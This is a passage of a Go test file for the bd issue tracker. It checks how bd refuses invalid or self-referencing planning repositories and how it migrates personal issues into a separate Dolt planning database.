// one, so no refusal may point it at the shared root, which would only be
// refused in turn.
func TestRefuseSelfPlanningRepo(t *testing.T) {
	root := t.TempDir()
	// workspace writes a .beads under root/name whose metadata.json names
	// database and projectID, redirecting to target when it is set.
	workspace := func(name, database, projectID, target string) string {
		beadsDir := filepath.Join(root, name, ".beads")
		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
			t.Fatalf("create %s: %v", beadsDir, err)
		}
		cfg := configfile.DefaultConfig()
		cfg.Backend = configfile.BackendDolt
		cfg.DoltMode = configfile.DoltModeServer
		cfg.DoltDatabase = database
		cfg.ProjectID = projectID
		if err := cfg.Save(beadsDir); err != nil {
			t.Fatalf("write %s metadata.json: %v", name, err)
		}
		if target != "" {
			if err := os.WriteFile(filepath.Join(beadsDir, "redirect"), []byte(target+"\n"), 0o600); err != nil {
				t.Fatalf("write %s redirect: %v", name, err)
			}
		}
		return beadsDir
	}
	// A shared root whose rigs redirect to its .beads and each name a
	// database of their own (preserveRedirectSourceDatabase), and a plain
	// project with stubs redirecting to it.
	town := workspace("town", "hq", "town-id", "")
	project := workspace("project", "proj", "project-id", "")
	// A legacy workspace whose metadata.json names no dolt_database: bd uses
	// the default database there.
	legacy := workspace("legacy", "", "legacy-id", "")
	for _, tc := range []struct {
		name string
		// projectBeadsDir is the project's .beads as the command resolved
		// it, and launchDatabase the BEADS_DOLT_SERVER_DATABASE it opened
		// its store under ("" for none).
		projectBeadsDir, launchDatabase string
		planningBeadsDir                string
		want                            string
	}{
		{name: "the project itself", projectBeadsDir: project, planningBeadsDir: project,
			want: "is this project's own workspace"},
		{name: "a stub naming no database", projectBeadsDir: project,
			planningBeadsDir: workspace("stub", "", "", project), want: "is this project's own workspace"},
		{name: "a stub naming the project's database", projectBeadsDir: project,
			planningBeadsDir: workspace("worktree", "proj", "", project), want: "is this project's own workspace"},
		{name: "a stub naming a database of its own", projectBeadsDir: project,
			planningBeadsDir: workspace("rig", "rig", "", project),
			want:             `where bd uses the database "rig" that the planning repo names; routing.contributor cannot select that database`},
		{name: "the project's own rig under a shared root", projectBeadsDir: town, launchDatabase: "rga",
			planningBeadsDir: workspace("rigA", "rga", "", town), want: "is this project's own workspace"},
		{name: "a rig beside the project under a shared root", projectBeadsDir: town, launchDatabase: "rga",
			planningBeadsDir: workspace("rigB", "rgb", "", town),
			want:             `where bd uses the database "rgb" that the planning repo names; routing.contributor cannot select that database`},
		// From a rig under a shared root, a planning repo using the shared
		// root's own database: the root itself, or a stub naming that
		// database or none. Not the project's database, and not a separate
		// planning repository either, so it stays refused, named as what it
		// is.
		{name: "the shared root itself", projectBeadsDir: town, launchDatabase: "rga",
			planningBeadsDir: town,
			want:             "planning repo " + filepath.Dir(town) + ` holds the .beads this project uses, where bd uses the database "hq", not this project's "rga"; a database beside this project's is not a separate planning repository`},
		{name: "a stub naming the shared root's database", projectBeadsDir: town, launchDatabase: "rga",
			planningBeadsDir: workspace("rigHQ", "hq", "", town),
			want:             `, which holds the .beads this project uses, where bd uses the database "hq", not this project's "rga"; a database beside this project's is not a separate planning repository`},
		{name: "a stub naming no database under a shared root", projectBeadsDir: town, launchDatabase: "rga",
			planningBeadsDir: workspace("rigNone", "", "", town),
			want:             `, which holds the .beads this project uses, where bd uses the database "hq", not this project's "rga"; a database beside this project's is not a separate planning repository`},
		{name: "a legacy project itself", projectBeadsDir: legacy, planningBeadsDir: legacy,
			want: "is this project's own workspace"},
		{name: "a legacy shared root itself", projectBeadsDir: legacy, launchDatabase: "rga",
			planningBeadsDir: legacy,
			want:             "planning repo " + filepath.Dir(legacy) + ` holds the .beads this project uses, where bd uses the database "beads", not this project's "rga"`},
		{name: "a stub naming no database under a legacy shared root", projectBeadsDir: legacy, launchDatabase: "rga",
			planningBeadsDir: workspace("legacyRigNone", "", "", legacy),
			want:             `, which holds the .beads this project uses, where bd uses the database "beads", not this project's "rga"`},
		{name: "a clone carrying the project's project_id", projectBeadsDir: project,
			planningBeadsDir: workspace("clone", "proj", "project-id", ""),
			want:             "has this project's project_id (project-id), so it is a clone of this project's workspace"},
		{name: "a separate planning repository", projectBeadsDir: project,
			planningBeadsDir: workspace("planning", "pl", "planning-id", "")},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv("BEADS_DOLT_SERVER_DATABASE", tc.launchDatabase)
			err := refuseSelfPlanningRepo(filepath.Dir(tc.planningBeadsDir), tc.planningBeadsDir, tc.projectBeadsDir)
			switch {
			case tc.want == "" && err != nil:
				t.Errorf("refuseSelfPlanningRepo = %v, want nil", err)
			case tc.want != "" && (err == nil || !strings.Contains(err.Error(), tc.want)):
				t.Errorf("refuseSelfPlanningRepo = %v, want an error containing %q", err, tc.want)
			}
			const remedy = "; set routing.contributor to a separate planning repository (e.g. ~/.beads-planning)"
			if err != nil && !strings.HasSuffix(err.Error(), remedy) {
				t.Errorf("refuseSelfPlanningRepo = %v, want its remedy to end %q", err, remedy)
			}
		})
	}
}

// TestRefuseUninitializablePlanningRepoRaisesPlanningRepoRefusals verifies
// that the refusals a metadata-less planning repo shares with a routed bd
// create (refuseUninitializableTarget's own) are raised as refusals of the
// planning repo, named as such, which planningOpenError returns as they are,
// with no "failed to open planning store" prefix. bd's own admission refusal
// is returned as it is, for planningOpenError to render as bd renders it.
func TestRefuseUninitializablePlanningRepoRaisesPlanningRepoRefusals(t *testing.T) {
	// databaseMarker is the file embeddeddolt.Databases looks for to count an
	// embedded database.
	databaseMarker := func(database string) string {
		return filepath.Join("embeddeddolt", database, ".dolt", "noms", "manifest")
	}
	for _, tc := range []struct {
		name  string
		files map[string]string
		// want follows "planning repo <dir>" in the refusal; "" is bd's own
		// admission refusal.
		want string
	}{
		{name: "server mode", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n"},
			want: " has no metadata.json and its own config selects Dolt server mode (dolt.mode: server); "},
		{name: "remote dolt.host", files: map[string]string{"config.yaml": "dolt:\n  host: db.example.com\n"},
			want: ` has no metadata.json and its own config selects Dolt server mode (dolt.host: "db.example.com"); `},
		{name: "unreadable config", files: map[string]string{"config.yaml": "dolt: [unterminated\n"},
			want: " has no metadata.json and its dolt.mode cannot be read ("},
		{name: "several databases", files: map[string]string{databaseMarker("beads"): "x", databaseMarker("other"): "x"},
			want: " has no metadata.json and holds several databases (beads, other); give it a metadata.json whose dolt_database names the one to use, then rerun"},
		{name: "sqlite-era repo", files: map[string]string{"config.json": `{"database":"beads.db"}`, "beads.db": "SQLite format 3\x00" + strings.Repeat("\x00", 4080)}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			planningDir := t.TempDir()
			planningBeadsDir := filepath.Join(planningDir, ".beads")
			for name, content := range tc.files {
				path := filepath.Join(planningBeadsDir, name)
				if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			err := refuseUninitializablePlanningRepo(planningBeadsDir)
			var refusal *planningRepoRefusal
			if tc.want == "" {
				if !isLegacyUpgradeRefusal(err) {
					t.Fatalf("refuseUninitializablePlanningRepo() = %v (%T), want bd's own admission refusal as it is", err, err)
				}
				return
			}
			if want := "planning repo " + planningDir + tc.want; !errors.As(err, &refusal) || !strings.HasPrefix(err.Error(), want) {
				t.Fatalf("refuseUninitializablePlanningRepo() = %v (%T), want a *planningRepoRefusal starting %q", err, err, want)
			}
			if got := planningOpenError(planningDir, err); got == nil || got.Error() != err.Error() {
				t.Errorf("planningOpenError() = %v, want the refusal as it is: %v", got, err)
			}
		})
	}
}

// TestEmbeddedMigratePersonal_refusesMetadataWithoutDoltDatabase verifies that
// a planning repo whose metadata.json names no dolt_database is refused before
// anything moves, and that no database is created in it: the launcher's
// database name would otherwise choose one.
func TestEmbeddedMigratePersonal_refusesMetadataWithoutDoltDatabase(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mpx")
	planningDir := setupContributorRouting(t, bd, dir)
	planningBeadsDir := filepath.Join(planningDir, ".beads")

	metadataPath := filepath.Join(planningBeadsDir, "metadata.json")
	raw, err := os.ReadFile(metadataPath)
	if err != nil {
		t.Fatalf("read planning metadata.json: %v", err)
	}
	var meta map[string]any
	if err := json.Unmarshal(raw, &meta); err != nil {
		t.Fatalf("parse planning metadata.json: %v", err)
	}
	delete(meta, "dolt_database")
	raw, err = json.Marshal(meta)
	if err != nil {
		t.Fatalf("encode planning metadata.json: %v", err)
	}
	if err := os.WriteFile(metadataPath, raw, 0o600); err != nil {
		t.Fatalf("write planning metadata.json: %v", err)
	}
	databasesBefore := embeddeddolt.Databases(planningBeadsDir)

	personal := bdCreate(t, bd, dir, "Personal issue for a nameless planning repo")

	requireMigratePersonalRefused(t, bd, dir, "has no dolt_database field")
	requireStillInProject(t, beadsDir, "mpx", personal.ID)
	if got := embeddeddolt.Databases(planningBeadsDir); !slices.Equal(got, databasesBefore) {
		t.Errorf("planning repo databases = %v after a refused migrate-personal, want unchanged %v", got, databasesBefore)
	}
}

// createForkSetupPlanningDatabase creates the "beads" database fork setup
// leaves in a planning .beads with no metadata.json
// (autoConfigureForkContributor), and runs fill on it when fill is set. What
// fill writes is committed, as the bd commands that write it commit it.
func createForkSetupPlanningDatabase(t *testing.T, planningBeadsDir string, fill func(s *embeddeddolt.EmbeddedDoltStore) error) {
	t.Helper()
	s, err := embeddeddolt.Open(t.Context(), planningBeadsDir, "beads", "main")
	if err != nil {
		t.Fatalf("create the fork-setup planning database: %v", err)
	}
	if fill != nil {
		if err := fill(s); err != nil {
			_ = s.Close()
			t.Fatalf("fill the fork-setup planning database: %v", err)
		}
		if err := s.Commit(t.Context(), "fill the fork-setup planning database"); err != nil {
			_ = s.Close()
			t.Fatalf("commit the fork-setup planning database: %v", err)
		}
	}
	if err := s.Close(); err != nil {
		t.Fatalf("close the fork-setup planning database: %v", err)
	}
}

// TestEmbeddedMigratePersonal_initializesContributorPlanningRepos verifies that
// the planning repos contributor setup leaves behind are given a metadata.json
// and then migrated into. The wizard's empty .beads (runContributorWizard) is
// initialized the way a routed bd create initializes it, with a database named
// after the project prefix. Fork setup's database, which has no metadata.json
// and no issue_prefix (autoConfigureForkContributor), is adopted rather than
// hidden behind a new one: it takes the project's prefix, and when it already
// holds issues they stay visible, under its own prefix and project identity.
// An initialization that writes to the database is committed on its own,
// before the copy's commit.
func TestEmbeddedMigratePersonal_initializesContributorPlanningRepos(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	// kept is the planning repo's own issue in the fork-setup database that
	// already holds issues, under the planning repo's prefix and identity.
	kept := &types.Issue{
		ID:        "pl-kept",
		Title:     "Planning issue already in the fork-setup database",
		Status:    types.StatusOpen,
		IssueType: types.TypeTask,
		CreatedBy: "planner",
	}
	const keptProjectID = "fork-setup-planning-project"

	bd := buildEmbeddedBD(t)
	for _, tc := range []struct {
		name   string
		prefix string
		// database is the planning database the issue moves into and the
		// metadata.json migrate-personal writes names; wantPrefix is its
		// issue_prefix afterwards.
		database, wantPrefix string
		// initCommit is whether the initialization writes to the database (it
		// sets the issue_prefix), so that the database gets a commit of its own.
		initCommit bool
		// setup shapes planningBeadsDir, which exists and is empty.
		setup func(t *testing.T, planningBeadsDir string)
		// check, when set, makes the case's own assertions after the move.
		check func(t *testing.T, planningBeadsDir string, planning *embeddeddolt.EmbeddedDoltStore)
	}{
		{
			name: "wizard empty beads dir", prefix: "mpw", database: "mpw", wantPrefix: "mpw", initCommit: true,
			setup: func(*testing.T, string) {},
		},
		{
			name: "fork setup database without metadata", prefix: "mpf", database: "beads", wantPrefix: "mpf", initCommit: true,
			setup: func(t *testing.T, planningBeadsDir string) {
				createForkSetupPlanningDatabase(t, planningBeadsDir, nil)
			},
		},
		{
			name: "fork setup database holding issues", prefix: "mpk", database: "beads", wantPrefix: "pl",
			setup: func(t *testing.T, planningBeadsDir string) {
				createForkSetupPlanningDatabase(t, planningBeadsDir, func(s *embeddeddolt.EmbeddedDoltStore) error {
					if err := s.SetConfig(t.Context(), "issue_prefix", "pl"); err != nil {
						return err
					}
					if err := s.SetMetadata(t.Context(), "_project_id", keptProjectID); err != nil {
						return err
					}
					return s.CreateIssue(t.Context(), kept, kept.CreatedBy)
				})
			},
			check: func(t *testing.T, planningBeadsDir string, planning *embeddeddolt.EmbeddedDoltStore) {
				got, err := planning.GetIssue(t.Context(), kept.ID)
				if err != nil {
					t.Fatalf("the planning repo's own issue %s is not in its database after migrate-personal: %v", kept.ID, err)
				}
				if got.Title != kept.Title {
					t.Errorf("planning issue %s title = %q, want unchanged %q", kept.ID, got.Title, kept.Title)
				}
				// A new project_id would fail bd's workspace identity check
				// for every write in the planning repo.
				cfg, err := configfile.Load(planningBeadsDir)
				if err != nil || cfg == nil {
					t.Fatalf("load planning metadata.json: cfg = %v, err = %v", cfg, err)
				}
				if cfg.ProjectID != keptProjectID {
					t.Errorf("planning metadata.json project_id = %q, want the database's own _project_id %q", cfg.ProjectID, keptProjectID)
				}
			},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			dir, beadsDir, _ := bdInit(t, bd, "--prefix", tc.prefix)
			planningDir := t.TempDir()
			planningBeadsDir := filepath.Join(planningDir, ".beads")
			if err := os.MkdirAll(planningBeadsDir, 0o750); err != nil {
				t.Fatalf("create planning .beads: %v", err)
			}
			tc.setup(t, planningBeadsDir)
			if out, err := bdRunWithFlockRetry(t, bd, dir, "config", "set", "routing.contributor", planningDir); err != nil {
				t.Fatalf("bd config set routing.contributor: %v\n%s", err, out)
			}
			personal := bdCreate(t, bd, dir, "Personal issue for a contributor planning repo")

			out := requireMigratePersonal(t, bd, dir)
			if !strings.Contains(out, "Moved 1 issue") {
				t.Errorf("migrate-personal output does not report moving 1 issue:\n%s", out)
			}
			database, err := loadDoltDatabase(planningBeadsDir)
			if err != nil {
				t.Fatalf("planning metadata.json after migrate-personal: %v", err)
			}
			if database != tc.database {
				t.Errorf("planning metadata.json dolt_database = %q, want %q", database, tc.database)
			}
			if _, dirty := embeddedLogCountAndDirtyTables(t, planningBeadsDir); len(dirty) != 0 {
				t.Errorf("planning repo has uncommitted changes after migrate-personal: %v", dirty)
			}
			if got := embeddeddolt.Databases(planningBeadsDir); !slices.Equal(got, []string{tc.database}) {
				t.Errorf("planning repo databases = %v, want only %q (no second database beside the planning repo's own)", got, tc.database)
			}
			planning := openStore(t, planningBeadsDir, tc.database)
			commits, err := planning.Log(t.Context(), 0)
			if err != nil {
				t.Fatalf("planning database Log: %v", err)
			}
			const initCommitPrefix = "bd: migrate-personal: initialize planning repo (auto-commit) by "
			if got := slices.ContainsFunc(commits, func(c storage.CommitInfo) bool { return strings.HasPrefix(c.Message, initCommitPrefix) }); got != tc.initCommit {
				t.Errorf("planning history has a %q... commit: %v, want %v", initCommitPrefix, got, tc.initCommit)
			}
			moved, err := planning.GetIssue(t.Context(), personal.ID)
			if err != nil {
				t.Fatalf("issue %s not in the planning database %q: %v", personal.ID, tc.database, err)
			}
			if moved.Title != "Personal issue for a contributor planning repo" {
				t.Errorf("planning issue %s title = %q", personal.ID, moved.Title)
			}
			if prefix, err := planning.GetConfig(t.Context(), "issue_prefix"); err != nil || prefix != tc.wantPrefix {
				t.Errorf("planning database issue_prefix = %q (err %v), want %q", prefix, err, tc.wantPrefix)
			}
			if tc.check != nil {
				tc.check(t, planningBeadsDir, planning)
			}
			if _, err := openStore(t, beadsDir, tc.prefix).GetIssue(t.Context(), personal.ID); !errors.Is(err, storage.ErrNotFound) {
				t.Errorf("issue %s still in the project database: err = %v, want storage.ErrNotFound", personal.ID, err)
			}
		})
	}
}

// TestEmbeddedMigratePersonal_refusesUncommittedPlanningChanges verifies that
// a planning repo whose working set already holds changes is refused before
// anything moves. The move's embedded commit is DOLT_COMMIT('-Am'), which would
// publish them under migrate-personal's message. The refusal is the Error line
// alone, and names its remedy, bd dolt commit in the planning repo, after
// which a rerun moves the issue. A database with no metadata.json is refused
// before its adoption writes anything: no issue_prefix and no metadata.json.
// When that database is not the default one, bd run in the planning repo
// opens the default one instead, so the remedy first gives the repo a
// metadata.json naming it.
func TestEmbeddedMigratePersonal_refusesUncommittedPlanningChanges(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	requireNoMetadata := func(t *testing.T, planningBeadsDir string) {
		t.Helper()
		if _, err := os.Stat(filepath.Join(planningBeadsDir, "metadata.json")); !os.IsNotExist(err) {
			t.Errorf("planning metadata.json written by a refused migrate-personal: stat err = %v, want not exist", err)
		}
	}
	const commitRemedy = "commit them there with `bd dolt commit`, then rerun; nothing was moved"
	bd := buildEmbeddedBD(t)
	for _, tc := range []struct {
		name   string
		prefix string
		// planningRepo returns a planning repo whose working set holds a
		// change, and the database that holds it.
		planningRepo func(t *testing.T, dir string) (planningDir, database string)
		// remedy is the end of the refusal; nameDatabase is whether it first
		// asks for a metadata.json naming the database, which the test then
		// writes before running bd dolt commit.
		remedy       string
		nameDatabase bool
		// check, when set, makes the case's own assertions after the refusal.
		check func(t *testing.T, planningBeadsDir string)
	}{
		{
			name: "initialized planning repo", prefix: "mpu", remedy: commitRemedy,
			planningRepo: func(t *testing.T, dir string) (string, string) {
				planningDir := setupContributorRouting(t, bd, dir)
				// A write the planning repo's own dolt.auto-commit left
				// uncommitted.
				bdCreate(t, bd, planningDir, "Planning issue left uncommitted", "--dolt-auto-commit", "off")
				return planningDir, migratePersonalPlanningDatabase
			},
		},
		{
			// The shape an ensureBeadsDirForPath interrupted before it saved
			// metadata.json leaves, or a hand-removed metadata.json.
			name: "database not named beads without metadata", prefix: "mpn", nameDatabase: true,
			remedy: `bd run there opens the database "pl" only once a metadata.json names it, so give it a .beads/metadata.json whose dolt_database is "pl", ` + commitRemedy,
			planningRepo: func(t *testing.T, dir string) (string, string) {
				planningDir := setupContributorRouting(t, bd, dir)
				bdCreate(t, bd, planningDir, "Planning issue left uncommitted", "--dolt-auto-commit", "off")
				if err := os.Remove(filepath.Join(planningDir, ".beads", "metadata.json")); err != nil {
					t.Fatalf("remove planning metadata.json: %v", err)
				}
				return planningDir, migratePersonalPlanningDatabase
			},
			check: requireNoMetadata,
		},
		{
			name: "fork setup database", prefix: "mpe", remedy: commitRemedy,
			planningRepo: func(t *testing.T, dir string) (string, string) {
				planningDir := t.TempDir()
				planningBeadsDir := filepath.Join(planningDir, ".beads")
				if err := os.MkdirAll(planningBeadsDir, 0o750); err != nil {
					t.Fatalf("create planning .beads: %v", err)
				}
				createForkSetupPlanningDatabase(t, planningBeadsDir, nil)
				s, err := embeddeddolt.Open(t.Context(), planningBeadsDir, "beads", "main")
				if err != nil {
					t.Fatalf("open the fork-setup planning database: %v", err)
				}
				err = s.SetMetadata(t.Context(), "_project_id", "uncommitted-fork-setup-project")
				if closeErr := s.Close(); err == nil {
					err = closeErr
				}
				if err != nil {
					t.Fatalf("leave a change uncommitted in the fork-setup planning database: %v", err)
				}
				if out, err := bdRunWithFlockRetry(t, bd, dir, "config", "set", "routing.contributor", planningDir); err != nil {
					t.Fatalf("bd config set routing.contributor: %v\n%s", err, out)
				}
				return planningDir, "beads"
			},
			check: func(t *testing.T, planningBeadsDir string) {
				requireNoMetadata(t, planningBeadsDir)
				if prefix, err := openStore(t, planningBeadsDir, "beads").GetConfig(t.Context(), "issue_prefix"); err != nil || prefix != "" {
					t.Errorf("planning database issue_prefix = %q (err %v) after a refused migrate-personal, want it unset", prefix, err)
				}
			},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			dir, beadsDir, _ := bdInit(t, bd, "--prefix", tc.prefix)
			planningDir, database := tc.planningRepo(t, dir)
			planningBeadsDir := filepath.Join(planningDir, ".beads")
			commitsBefore, dirtyBefore := planningLogCountAndDirtyTables(t, planningBeadsDir, database)
			if len(dirtyBefore) == 0 {
				t.Fatal("the planning repo has no uncommitted changes to refuse")
			}
			const title = "Personal issue for a planning repo with uncommitted changes"
			personal := bdCreate(t, bd, dir, title)

			// The refusal is the Error line alone: no "failed to open planning
			// store" prefix, since nothing failed to open.
			out := requireMigratePersonalRefused(t, bd, dir, "Error: planning repo "+planningDir+" has uncommitted changes (")
			if !strings.Contains(out, tc.remedy) {
				t.Errorf("bd migrate-personal --yes output does not name the remedy %q:\n%s", tc.remedy, out)
			}
			requireStillInProject(t, beadsDir, tc.prefix, personal.ID)
			requireInNoPlanningDatabase(t, planningBeadsDir, personal.ID)
			if commits, dirty := planningLogCountAndDirtyTables(t, planningBeadsDir, database); commits != commitsBefore || !slices.Equal(dirty, dirtyBefore) {
				t.Errorf("planning repo after a refused migrate-personal: %d commits, uncommitted %v; want unchanged %d, %v", commits, dirty, commitsBefore, dirtyBefore)
			}
			if tc.check != nil {
				tc.check(t, planningBeadsDir)
			}

			// The remedy, as the refusal prints it.
			if tc.nameDatabase {
				raw, err := json.Marshal(map[string]string{"dolt_database": database})
				if err != nil {
					t.Fatalf("encode planning metadata.json: %v", err)
				}
				if err := os.WriteFile(filepath.Join(planningBeadsDir, "metadata.json"), raw, 0o600); err != nil {
					t.Fatalf("write planning metadata.json: %v", err)
				}
			}
			if out, err := bdRunWithFlockRetry(t, bd, planningDir, "dolt", "commit"); err != nil {
				t.Fatalf("bd dolt commit in the planning repo: %v\n%s", err, out)
			}
			out = requireMigratePersonal(t, bd, dir)
			if !strings.Contains(out, "Moved 1 issue") {
				t.Errorf("migrate-personal after bd dolt commit does not report moving 1 issue:\n%s", out)
			}
			moved, err := openStore(t, planningBeadsDir, database).GetIssue(t.Context(), personal.ID)
			if err != nil || moved.Title != title {
				t.Errorf("planning issue %s after the rerun = %v (err %v), want %q", personal.ID, moved, err, title)
			}
		})
	}
}

// TestEmbeddedMigratePersonal_batchLeavesTheMoveUncommitted verifies that with
// dolt.auto-commit batch the move makes no Dolt commit in either repository:
// the copy and the delete both wait in their working sets for bd dolt commit,
// as every other batch write does. A planning repo that already holds
// uncommitted changes is not refused then, since no commit of the migration's
// publishes them.
func TestEmbeddedMigratePersonal_batchLeavesTheMoveUncommitted(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mpy")
	planningDir := setupContributorRouting(t, bd, dir)
	planningBeadsDir := filepath.Join(planningDir, ".beads")
	bdCreate(t, bd, planningDir, "Planning issue left uncommitted", "--dolt-auto-commit", "off")
	const title = "Personal issue moved in batch mode"
	personal := bdCreate(t, bd, dir, title)
	planningCommits, _ := embeddedLogCountAndDirtyTables(t, planningBeadsDir)
	projectCommits, projectDirty := embeddedLogCountAndDirtyTables(t, beadsDir)
	if len(projectDirty) != 0 {
		t.Fatalf("project has uncommitted changes before migrate-personal: %v", projectDirty)
	}

	out, err := bdMigratePersonal(t, bd, dir, "--yes", "--dolt-auto-commit", "batch")
	if err != nil || !strings.Contains(out, "Moved 1 issue") {
		t.Fatalf("bd migrate-personal --yes --dolt-auto-commit batch: err = %v, want it to move 1 issue:\n%s", err, out)
	}
	requireMovedToPlanning(t, beadsDir, "mpy", planningDir, personal.ID, title)
	// The planning repo was dirty before; the project's working set now
	// holds the delete.
	for _, repo := range []struct {
		beadsDir string
		commits  int
	}{
		{planningBeadsDir, planningCommits},
		{beadsDir, projectCommits},
	} {
		if commits, dirty := embeddedLogCountAndDirtyTables(t, repo.beadsDir); commits != repo.commits || len(dirty) == 0 {
			t.Errorf("%s after migrate-personal in batch mode: %d commits, uncommitted %v; want %d commits (none made) and the move left uncommitted", repo.beadsDir, commits, dirty, repo.commits)
		}
	}
}

// planningLogCountAndDirtyTables is embeddedLogCountAndDirtyTables for the
// embedded database database under beadsDir, which need not have a
// metadata.json naming it.
func planningLogCountAndDirtyTables(t *testing.T, beadsDir, database string) (commits int, dirty []string) {
	t.Helper()
	db, cleanup, err := embeddeddolt.OpenSQL(t.Context(), filepath.Join(beadsDir, "embeddeddolt"), database, "main")
	if err != nil {
		t.Fatalf("OpenSQL %s: %v", database, err)
	}
	defer func() { _ = cleanup() }()
	if err := db.QueryRowContext(t.Context(), "SELECT COUNT(*) FROM dolt_log").Scan(&commits); err != nil {
		t.Fatalf("query dolt_log: %v", err)
	}
	rows, err := db.QueryContext(t.Context(), "SELECT table_name, status FROM dolt_status ORDER BY table_name")
	if err != nil {
		t.Fatalf("query dolt_status: %v", err)
	}
	defer func() { _ = rows.Close() }()
	for rows.Next() {
		var table, status string
		if err := rows.Scan(&table, &status); err != nil {
			t.Fatalf("scan dolt_status: %v", err)
		}
		dirty = append(dirty, table+":"+status)
	}
	if err := rows.Err(); err != nil {
		t.Fatalf("iterate dolt_status: %v", err)
	}
	return commits, dirty
}

// TestEmbeddedMigratePersonal_refusesPlanningRepoWithoutDatabase verifies that
// a planning repo whose metadata.json names a database that has not been
// bootstrapped yet (a clone, say) is refused before anything moves, and is not
// given a database: a migration is not the place to create one.
func TestEmbeddedMigratePersonal_refusesPlanningRepoWithoutDatabase(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mpb")
	planningDir := setupContributorRouting(t, bd, dir)
	planningBeadsDir := filepath.Join(planningDir, ".beads")
	if err := os.RemoveAll(filepath.Join(planningBeadsDir, "embeddeddolt")); err != nil {
		t.Fatalf("remove the planning database: %v", err)
	}

	personal := bdCreate(t, bd, dir, "Personal issue for an unbootstrapped planning repo")

	requireMigratePersonalRefused(t, bd, dir, "no embedded database")
	requireStillInProject(t, beadsDir, "mpb", personal.ID)
	if got := embeddeddolt.Databases(planningBeadsDir); len(got) != 0 {
		t.Errorf("planning repo databases = %v after a refused migrate-personal, want none", got)
	}
}

// TestEmbeddedMigratePersonal_refusesIssueAlreadyInPlanningRepo verifies that
// an issue ID that already exists in the planning repo is refused before
// anything moves. Without the refusal the copy upserts onto the planning repo's
// row, overwriting it, and the project's copy is then deleted.
func TestEmbeddedMigratePersonal_refusesIssueAlreadyInPlanningRepo(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mpc")
	planningDir := setupContributorRouting(t, bd, dir)

	personal := bdCreate(t, bd, dir, "Project personal version")
	const planningTitle = "Planning repo ORIGINAL row"
	bdCreate(t, bd, planningDir, planningTitle, "--id", personal.ID, "--force")

	requireMigratePersonalRefused(t, bd, dir, "already exists in the planning repo")
	requireStillInProject(t, beadsDir, "mpc", personal.ID)
	planningBeadsDir := filepath.Join(planningDir, ".beads")
	kept, err := openStore(t, planningBeadsDir, migratePersonalPlanningDatabase).GetIssue(t.Context(), personal.ID)
	if err != nil {
		t.Fatalf("planning repo's own issue %s gone after a refused migrate-personal: %v", personal.ID, err)
	}
	if kept.Title != planningTitle {
		t.Errorf("planning issue %s title = %q after a refused migrate-personal, want unchanged %q", personal.ID, kept.Title, planningTitle)
	}
}

// TestEmbeddedMigratePersonal_repoSyncMirrorHint verifies the phase-0 refusal
// for a project copy that bd repo sync imported from the planning repo: the
// error names bd repo remove, and once the mirror is removed a rerun moves the
// remaining personal issue.
func TestEmbeddedMigratePersonal_repoSyncMirrorHint(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mps")
	planningDir := setupContributorRouting(t, bd, dir)

	const personalTitle = "Personal issue beside a repo sync mirror"
	personal := bdCreate(t, bd, dir, personalTitle)

	// The mirror counts as personal only when its creator is the project's git
	// identity; the planning repo's own HOME gives it a different one.
	const planningTitle = "Planning issue mirrored by repo sync"
	planningIssue := bdCreate(t, bd, planningDir, planningTitle, "--actor", personal.CreatedBy)
	if out, err := bdRunWithFlockRetry(t, bd, planningDir, "export", "-o", filepath.Join(".beads", "issues.jsonl")); err != nil {
		t.Fatalf("bd export in the planning repo: %v\n%s", err, out)
	}
	for _, args := range [][]string{{"repo", "add", planningDir}, {"repo", "sync"}} {
		if out, err := bdRunWithFlockRetry(t, bd, dir, args...); err != nil {
			t.Fatalf("bd %s: %v\n%s", strings.Join(args, " "), err, out)
		}
	}
	requireStillInProject(t, beadsDir, "mps", planningIssue.ID)

	// The path is quoted for this host's shell (TestShellQuotedFor), and
	// the hint says how to turn back on the hydration bd repo remove turns off.
	quoted, ok := shellQuotedFor(runtime.GOOS, planningDir)
	if !ok {
		t.Fatalf("shellQuotedFor(%q, %q) cannot quote the planning repo's path", runtime.GOOS, planningDir)
	}
	requireMigratePersonalRefused(t, bd, dir, "by `bd repo sync` (remove those copies with `bd repo remove "+quoted+
